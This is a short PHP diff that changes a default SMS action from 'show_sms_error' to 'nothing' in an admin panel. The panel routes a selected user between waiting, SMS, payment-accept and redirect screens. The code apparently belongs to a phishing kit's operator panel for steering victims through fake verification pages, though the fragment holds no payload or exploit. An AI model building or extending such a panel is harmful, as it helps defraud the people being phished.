@@ -109,7 +109,7 @@ if ($isAdmin && isset($_POST['ajax']) && $_POST['ajax'] === 'toggle_chat') {
 
 $currentState = $selectedUserId !== '' ? panelLoadState($selectedUserId) : panelDefaults();
 $currentRoute = $currentState['instruction'] === 'stay_wait' ? 'waiting' : 'sms';
-$currentSmsAction = 'show_sms_error';
+$currentSmsAction = 'nothing';
 if ($currentState['mode'] === 'payment_accept') {
     $currentSmsAction = 'show_payment_accept';
 } elseif ($currentState['mode'] === 'redirect_custom' || $currentState['mode'] === 'redirect_wait') {
